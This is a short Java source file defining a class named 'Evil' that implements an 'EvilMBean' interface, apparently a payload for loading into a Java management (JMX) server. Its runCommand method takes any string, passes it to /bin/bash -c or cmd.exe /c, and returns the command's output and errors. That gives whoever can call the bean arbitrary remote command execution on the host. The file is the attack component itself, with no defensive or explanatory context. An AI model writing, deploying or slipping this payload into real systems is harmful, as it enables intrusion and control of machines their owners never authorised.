package com.cqq;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Evil implements EvilMBean {
    public Evil() {
    }

    public String runCommand(String cmd) {
        try {
            if (isLinux()) {
                cmd = "/bin/bash -c " + cmd;
            } else {
                cmd = "cmd.exe /c " + cmd;
            }

            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

            String stdout_err_data;
            String s;
            for(stdout_err_data = ""; (s = stdInput.readLine()) != null; stdout_err_data = stdout_err_data + s + "\n") {
            }

            while((s = stdError.readLine()) != null) {
                stdout_err_data = stdout_err_data + s + "\n";
            }

            proc.waitFor();
            return stdout_err_data;
        } catch (Exception var8) {
            return var8.toString();
        }
    }

    static boolean isLinux() {
        return System.getProperty("os.name").toLowerCase().indexOf("linux") >= 0;
    }
}
